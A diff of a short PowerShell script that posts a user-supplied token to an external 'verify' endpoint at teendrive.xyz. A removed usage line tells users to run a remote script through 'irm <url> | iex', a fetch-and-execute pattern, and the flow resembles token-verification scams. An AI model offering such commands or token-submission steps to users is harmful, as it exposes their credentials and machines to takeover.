@@ -1,20 +1,16 @@
-param(
-    [string]$token
-)
+   if (-not $token) {
+       Write-Host "No token provided. Exiting."
+       exit 1
+   }
 
-if (-not $token) {
-    Write-Host "No token provided. Usage: powershell -command \"irm <url> | iex; verify -token <token>\""
-    exit 1
-}
+   $endpoint = "https://teendrive.xyz/api/verify"
+   $body = @{ token = $token } | ConvertTo-Json
 
-$endpoint = "https://teendrive.xyz/api/verify"
-$body = @{ token = $token } | ConvertTo-Json
-
-try {
-    $response = Invoke-RestMethod -Uri $endpoint -Method Post -Body $body -ContentType "application/json"
-    Write-Host "Verification sent! Server response:" -ForegroundColor Green
-    Write-Host $response
-} catch {
-    Write-Host "Verification failed. Error:" -ForegroundColor Red
-    Write-Host $_
-}
+   try {
+       $response = Invoke-RestMethod -Uri $endpoint -Method Post -Body $body -ContentType "application/json"
+       Write-Host "Verification sent! Server response:" -ForegroundColor Green
+       Write-Host $response
+   } catch {
+       Write-Host "Verification failed. Error:" -ForegroundColor Red
+       Write-Host $_
+   }
